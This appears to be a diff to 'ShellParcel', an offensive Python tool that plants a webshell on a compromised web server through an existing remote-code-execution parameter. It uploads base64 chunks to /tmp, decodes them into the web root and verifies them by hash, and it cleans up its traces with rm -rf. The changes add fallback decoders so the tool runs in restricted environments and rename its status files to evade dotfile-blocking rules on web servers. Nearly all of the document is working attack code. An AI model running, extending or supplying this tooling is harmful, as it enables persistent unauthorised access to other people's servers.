@@ -2,7 +2,7 @@
 """
 ShellParcel - Idempotent Chunked Webshell Deployer (Audited & Hardened)
 A file-transfer utility that retrieves file contents through an existing webshell/RCE.
-Bypasses HTTP 414 URI Too Long, multi-spawn race conditions, and blind RCE limitations.
+Bypasses HTTP 414 URI Too Long, multi-spawn race conditions, blind RCE limitations, and restricted environments.
 """
 
 import argparse
@@ -45,9 +45,9 @@ def send_cmd(url, wsp, cmd):
         print(f"\n{Fore.RED}[-] HTTP Failure: {e}")
         return None
 
-def fetch_status(url, filename):
+def fetch_status(base_url, filename):
     """Fetches a status or hash file from the web root for blind RCE verification."""
-    target_url = f"{url.rstrip('/')}/{filename}"
+    target_url = f"{base_url.rstrip('/')}/{filename}"
     try:
         resp = requests.get(target_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
         if resp.status_code == 200:
@@ -55,6 +55,39 @@ def fetch_status(url, filename):
         return None
     except Exception:
         return None
+
+def build_verify_size_cmd(tmp_dir, web_root, status_file, expected_size, total_chunks):
+    """Generates POSIX-compliant shell command to verify chunk sizes with fallbacks."""
+    return (
+        f"expected={expected_size}; actual=0; "
+        f"i=0; while [ $i -le {total_chunks-1} ]; do "
+        f"f=\"{tmp_dir}/.sp_c_$(printf \"%04d\" $i)\"; "
+        f"if [ -f \"$f\" ]; then "
+        # Fallbacks for wc: stat (GNU/BSD) -> ls
+        f"sz=$(wc -c < \"$f\" 2>/dev/null || stat -c %s \"$f\" 2>/dev/null || stat -f %z \"$f\" 2>/dev/null || ls -l \"$f\" | awk '{{print $5}}'); "
+        f"actual=$((actual + sz)); "
+        f"fi; "
+        f"i=$((i+1)); done; "
+        f"if [ \"$actual\" -eq \"$expected\" ]; then echo \"OK\" > \"{web_root}/{status_file}\"; "
+        f"else echo \"FAIL_$actual\" > \"{web_root}/{status_file}\"; fi"
+    )
+
+def build_decode_cmd(tmp_dir, web_root, remote_path, hash_file, status_file, total_chunks):
+    """Generates POSIX-compliant shell command to decode and hash with extensive fallbacks."""
+    return (
+        f"i=0; while [ $i -le {total_chunks-1} ]; do "
+        f"f=\"{tmp_dir}/.sp_c_$(printf \"%04d\" $i)\"; "
+        # Fallbacks for cat: sed -> awk -> head
+        f"[ -f \"$f\" ] && (cat \"$f\" 2>/dev/null || sed -n 'p' \"$f\" 2>/dev/null || awk 1 \"$f\" 2>/dev/null || head -c 1000000000 \"$f\" 2>/dev/null); "
+        f"i=$((i+1)); done | "
+        # Fallbacks for base64: openssl -> python3 -> python2 -> perl
+        f"(base64 -d 2>/dev/null || openssl base64 -d 2>/dev/null || python3 -c 'import base64,sys;sys.stdout.buffer.write(base64.b64decode(sys.stdin.read()))' 2>/dev/null || python -c 'import base64,sys;sys.stdout.write(base64.b64decode(sys.stdin.read()))' 2>/dev/null || perl -MMIME::Base64 -ne 'print decode_base64($_)' 2>/dev/null) > \"{remote_path}\" 2>/dev/null; "
+        f"if [ $? -eq 0 ]; then "
+        # Fallbacks for sha256sum: shasum -> openssl -> sha256
+        f"h=$(sha256sum \"{remote_path}\" 2>/dev/null || shasum -a 256 \"{remote_path}\" 2>/dev/null || openssl dgst -sha256 \"{remote_path}\" 2>/dev/null | awk '{{print $NF}}' || sha256 \"{remote_path}\" 2>/dev/null); "
+        f"echo \"$h\" | awk '{{print $1}}' > \"{web_root}/{hash_file}\" && echo \"OK\" > \"{web_root}/{status_file}\"; "
+        f"else echo \"DECODE_FAIL\" > \"{web_root}/{status_file}\"; fi"
+    )
 
 def run_logic_tests():
     """Automated test suite simulating blind RCE execution against a local filesystem."""
@@ -79,8 +112,10 @@ def run_logic_tests():
         def test_file_transfer(self, file_content, chunk_size=500):
             filename = "testfile.bin"
             remote_path = os.path.join(self.web_root, filename)
+            status_file = "sp_status.txt"
+            hash_file = "sp_hash.txt"
             
-            self.run_bash(f"rm -rf {self.tmp_dir}/.sp_l_* {self.tmp_dir}/.sp_c_* {self.web_root}/.sp_status 2>/dev/null")
+            self.run_bash(f"rm -rf {self.tmp_dir}/.sp_l_* {self.tmp_dir}/.sp_c_* {self.web_root}/{status_file} 2>/dev/null")
             
             payload = base64.b64encode(file_content).decode()
             chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
@@ -91,47 +126,28 @@ def run_logic_tests():
                 chunk_file = f"{self.tmp_dir}/.sp_c_{i:04d}"
                 cmd = f"mkdir {lock_dir} 2>/dev/null && printf '%s' '{chunk}' > {chunk_file}"
                 self.run_bash(cmd)
-                # Idempotency check
-                self.run_bash(cmd)
+                self.run_bash(cmd) # Idempotency check
                 with open(chunk_file, "r") as f:
                     self.assertEqual(f.read(), chunk, "Idempotency failed: chunk corrupted")
 
-            verify_size_cmd = (
-                f"expected={len(payload)}; actual=0; "
-                f"for i in $(seq 0 {total_chunks-1}); do "
-                f"f=\"{self.tmp_dir}/.sp_c_$(printf \"%04d\" $i)\"; "
-                f"[ -f \"$f\" ] && actual=$((actual + $(wc -c < \"$f\"))); done; "
-                f"if [ \"$actual\" -eq \"$expected\" ]; then echo \"OK\" > {self.web_root}/.sp_status; "
-                f"else echo \"FAIL_$actual\" > {self.web_root}/.sp_status; fi"
-            )
-            self.run_bash(verify_size_cmd)
-            with open(os.path.join(self.web_root, ".sp_status"), "r") as f:
+            verify_cmd = build_verify_size_cmd(self.tmp_dir, self.web_root, status_file, len(payload), total_chunks)
+            self.run_bash(verify_cmd)
+            with open(os.path.join(self.web_root, status_file), "r") as f:
                 self.assertEqual(f.read().strip(), "OK", "Size verification failed")
 
-            decode_cmd = (
-                f"for i in $(seq 0 {total_chunks-1}); do "
-                f"cat {self.tmp_dir}/.sp_c_$(printf \"%04d\" $i) 2>/dev/null; done | base64 -d > {remote_path} 2>/dev/null; "
-                f"if [ $? -eq 0 ]; then "
-                f"(sha256sum {remote_path} 2>/dev/null || shasum -a 256 {remote_path} 2>/dev/null) | awk '{{print $1}}' > {remote_path}.hash && echo \"OK\" > {self.web_root}/.sp_status; "
-                f"else echo \"DECODE_FAIL\" > {self.web_root}/.sp_status; fi"
-            )
+            decode_cmd = build_decode_cmd(self.tmp_dir, self.web_root, remote_path, hash_file, status_file, total_chunks)
             self.run_bash(decode_cmd)
-            with open(os.path.join(self.web_root, ".sp_status"), "r") as f:
+            with open(os.path.join(self.web_root, status_file), "r") as f:
                 self.assertEqual(f.read().strip(), "OK", "Decode failed")
 
-            with open(f"{remote_path}.hash", "r") as f:
+            with open(os.path.join(self.web_root, hash_file), "r") as f:
                 remote_hash = f.read().strip()
             local_hash = hashlib.sha256(file_content).hexdigest()
             self.assertEqual(remote_hash, local_hash, "SHA-256 mismatch")
 
-        def test_empty_file(self):
-            self.test_file_transfer(b"")
-
-        def test_binary_file(self):
-            self.test_file_transfer(os.urandom(1024 * 50))
-
-        def test_large_file(self):
-            self.test_file_transfer(os.urandom(1024 * 1024 * 2), chunk_size=1000)
+        def test_empty_file(self): self.test_file_transfer(b"")
+        def test_binary_file(self): self.test_file_transfer(os.urandom(1024 * 50))
+        def test_large_file(self): self.test_file_transfer(os.urandom(1024 * 1024 * 2), chunk_size=1000)
 
         def test_malformed_input(self):
             file_content = b"test"
@@ -141,16 +157,9 @@ def run_logic_tests():
             total_chunks = len(chunks)
             self.run_bash(f"mkdir {self.tmp_dir}/.sp_l_0000 2>/dev/null && printf '%s' '{chunks[0]}' > {self.tmp_dir}/.sp_c_0000")
             
-            verify_size_cmd = (
-                f"expected={len(payload)}; actual=0; "
-                f"for i in $(seq 0 {total_chunks-1}); do "
-                f"f=\"{self.tmp_dir}/.sp_c_$(printf \"%04d\" $i)\"; "
-                f"[ -f \"$f\" ] && actual=$((actual + $(wc -c < \"$f\"))); done; "
-                f"if [ \"$actual\" -eq \"$expected\" ]; then echo \"OK\" > {self.web_root}/.sp_status; "
-                f"else echo \"FAIL_$actual\" > {self.web_root}/.sp_status; fi"
-            )
-            self.run_bash(verify_size_cmd)
-            with open(os.path.join(self.web_root, ".sp_status"), "r") as f:
+            verify_cmd = build_verify_size_cmd(self.tmp_dir, self.web_root, "sp_status.txt", len(payload), total_chunks)
+            self.run_bash(verify_cmd)
+            with open(os.path.join(self.web_root, "sp_status.txt"), "r") as f:
                 status = f.read().strip()
                 self.assertTrue(status.startswith("FAIL"), f"Should have detected missing chunk, got: {status}")
 
@@ -218,13 +227,25 @@ def main():
         print(f"{Fore.RED}[-] Webshell Parameter Template (-wsp) must contain '$SP$' as the injection point.")
         sys.exit(1)
 
-    url = url.rstrip('/')
+    # Intelligent URL Parsing for Base URL (Fixes PATH_INFO routing issues)
+    parsed_url = urllib.parse.urlparse(url)
+    path_parts = parsed_url.path.split('/')
+    if path_parts[-1] and '.' in path_parts[-1]:
+        base_path = '/'.join(path_parts[:-1])
+    else:
+        base_path = parsed_url.path
+    base_url = urllib.parse.urlunparse((parsed_url.scheme, parsed_url.netloc, base_path, '', '', ''))
+
     if not wsp.startswith('?') and not wsp.startswith('/'):
         wsp = '/' + wsp
     
     remote_filename = os.path.basename(tf)
     remote_path = tp.rstrip('/') + '/' + remote_filename
     web_root = os.path.dirname(remote_path)
+    
+    # Use non-dotfiles to bypass Nginx/Apache dotfile blocking rules
+    status_file = f"sp_status_{remote_filename}.txt"
+    hash_file = f"sp_hash_{remote_filename}.txt"
     temp_b64_file = f"/tmp/.sp_b64_{remote_filename}"
 
     if not os.path.exists(tf):
@@ -245,9 +266,13 @@ def main():
     print(f"{Fore.GREEN}[+] Read {len(file_content)} bytes from '{tf}' (SHA-256: {local_hash[:16]}...)")
     print(f"{Fore.GREEN}[+] Encoded payload size: {len(payload)} chars")
 
+    transfer_success = False
+    verification_success = None
+    verification_method = "None"
+
     # Step 0: Cleanup
     print(f"{Fore.YELLOW}[*] Clearing temp files and locks on target...")
-    cleanup_cmd = f"rm -rf /tmp/.sp_l_* /tmp/.sp_c_* \"{temp_b64_file}\" \"{remote_path}.hash\" \"{web_root}/.sp_status\" 2>/dev/null"
+    cleanup_cmd = f"rm -rf /tmp/.sp_l_* /tmp/.sp_c_* \"{temp_b64_file}\" \"{remote_path}\" \"{web_root}/{hash_file}\" \"{web_root}/{status_file}\" 2>/dev/null"
     send_cmd(url, wsp, cleanup_cmd)
     time.sleep(1.5)
 
@@ -260,7 +285,6 @@ def main():
         lock_dir = f"/tmp/.sp_l_{i:04d}"
         chunk_file = f"/tmp/.sp_c_{i:04d}"
         
-        # mkdir acts as an atomic lock to prevent race conditions and duplicate writes
         cmd = f"mkdir {lock_dir} 2>/dev/null && printf '%s' '{chunk}' > {chunk_file}"
         
         print(f"{Fore.CYAN}    -> Sending chunk {i+1}/{total_chunks}...{Style.RESET_ALL}", end="\r")
@@ -272,21 +296,15 @@ def main():
         time.sleep(0.3)
 
     print(f"\n{Fore.GREEN}[+] All {total_chunks} chunks uploaded.                    ")
+    transfer_success = True
 
     # Step 2: Pre-decode Verification (Interrupted-transfer recovery)
     print(f"{Fore.YELLOW}[*] Verifying chunk integrity on target...")
-    verify_size_cmd = (
-        f"expected={len(payload)}; actual=0; "
-        f"for i in $(seq 0 {total_chunks-1}); do "
-        f"f=\"/tmp/.sp_c_$(printf \"%04d\" $i)\"; "
-        f"[ -f \"$f\" ] && actual=$((actual + $(wc -c < \"$f\"))); done; "
-        f"if [ \"$actual\" -eq \"$expected\" ]; then echo \"OK\" > \"{web_root}/.sp_status\"; "
-        f"else echo \"FAIL_$actual\" > \"{web_root}/.sp_status\"; fi"
-    )
+    verify_size_cmd = build_verify_size_cmd("/tmp", web_root, status_file, len(payload), total_chunks)
     send_cmd(url, wsp, verify_size_cmd)
     time.sleep(1.0)
     
-    status = fetch_status(url, ".sp_status")
+    status = fetch_status(base_url, status_file)
     if status == "OK":
         print(f"{Fore.GREEN}[+] All chunks verified on target. Size matches expected payload.")
     elif status is None:
@@ -297,13 +315,7 @@ def main():
 
     # Step 3: Decode and Hash
     print(f"{Fore.YELLOW}[*] Decoding payload to {remote_path}...")
-    decode_cmd = (
-        f"for i in $(seq 0 {total_chunks-1}); do "
-        f"cat /tmp/.sp_c_$(printf \"%04d\" $i) 2>/dev/null; done | base64 -d > \"{remote_path}\" 2>/dev/null; "
-        f"if [ $? -eq 0 ]; then "
-        f"(sha256sum \"{remote_path}\" 2>/dev/null || shasum -a 256 \"{remote_path}\" 2>/dev/null) | awk '{{print $1}}' > \"{remote_path}.hash\" && echo \"OK\" > \"{web_root}/.sp_status\"; "
-        f"else echo \"DECODE_FAIL\" > \"{web_root}/.sp_status\"; fi"
-    )
+    decode_cmd = build_decode_cmd("/tmp", web_root, remote_path, hash_file, status_file, total_chunks)
     
     resp = send_cmd(url, wsp, decode_cmd)
     if resp is None:
@@ -312,7 +324,7 @@ def main():
         
     time.sleep(1.5)
 
-    status = fetch_status(url, ".sp_status")
+    status = fetch_status(base_url, status_file)
     if status == "OK":
         print(f"{Fore.GREEN}[+] Base64 decoded successfully on target.")
     elif status == "DECODE_FAIL":
@@ -326,37 +338,56 @@ def main():
 
     # Step 4: Final Cryptographic Verification
     print(f"{Fore.YELLOW}[*] Performing SHA-256 verification...")
-    remote_hash = fetch_status(url, f"{remote_filename}.hash")
+    remote_hash = fetch_status(base_url, hash_file)
     
     if remote_hash and remote_hash == local_hash:
-        print(f"{Fore.GREEN}[+] SUCCESS! Cryptographic verification passed.")
-        print(f"    Local Hash:  {local_hash}")
-        print(f"    Remote Hash: {remote_hash}")
-        print(f"    URL: {url}/{remote_filename}")
+        verification_success = True
+        verification_method = "SHA-256 Match"
     elif remote_hash:
-        print(f"{Fore.RED}[-] Integrity Failure: SHA-256 mismatch!")
-        print(f"    Local Hash:  {local_hash}")
-        print(f"    Remote Hash: {remote_hash}")
-        sys.exit(1)
+        verification_success = False
+        verification_method = "SHA-256 Mismatch"
     else:
         print(f"{Fore.YELLOW}[!] Could not fetch remote hash. Falling back to HTTP status check...")
         try:
-            verify_resp = requests.get(f"{url}/{remote_filename}", headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
+            verify_resp = requests.get(f"{base_url}/{remote_filename}", headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
             if verify_resp.status_code == 200:
-                print(f"{Fore.YELLOW}[!] Webshell exists but hash verification was skipped. Status: {verify_resp.status_code}")
+                verification_success = True
+                verification_method = "HTTP 200 OK"
             elif verify_resp.status_code == 403:
-                print(f"{Fore.YELLOW}[!] Webshell exists but is forbidden. Status: {verify_resp.status_code}")
+                verification_success = True
+                verification_method = "HTTP 403 Forbidden (Exists)"
             else:
-                print(f"{Fore.RED}[-] Verification failed. Status: {verify_resp.status_code}")
-                sys.exit(1)
+                verification_success = False
+                verification_method = f"HTTP {verify_resp.status_code}"
         except Exception as e:
             print(f"{Fore.RED}[-] Verification error: {e}")
-            sys.exit(1)
+            verification_success = None
+            verification_method = "Network Error"
 
     # Cleanup temp files on target
     print(f"{Fore.YELLOW}[*] Cleaning up temporary chunk files...")
-    cleanup_cmd = f"rm -rf /tmp/.sp_l_* /tmp/.sp_c_* \"{temp_b64_file}\" \"{web_root}/.sp_status\" 2>/dev/null"
+    cleanup_cmd = f"rm -rf /tmp/.sp_l_* /tmp/.sp_c_* \"{temp_b64_file}\" \"{web_root}/{status_file}\" 2>/dev/null"
     send_cmd(url, wsp, cleanup_cmd)
+
+    # Final Report (Separating Transfer vs Verification)
+    print(f"\n{'='*60}")
+    print(f"{Fore.CYAN}FINAL REPORT{Style.RESET_ALL}")
+    print(f"{'='*60}")
+    if transfer_success:
+        print(f"{Fore.GREEN}[+] Transfer Status: SUCCESS")
+    else:
+        print(f"{Fore.RED}[-] Transfer Status: FAILED")
+        
+    if verification_success is True:
+        print(f"{Fore.GREEN}[+] Verification Status: SUCCESS ({verification_method})")
+    elif verification_success is False:
+        print(f"{Fore.RED}[-] Verification Status: FAILED ({verification_method})")
+    else:
+        print(f"{Fore.YELLOW}[!] Verification Status: UNKNOWN (Blind RCE / Restricted Webroot)")
+    print(f"{'='*60}\n")
+
+    if verification_success is False:
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
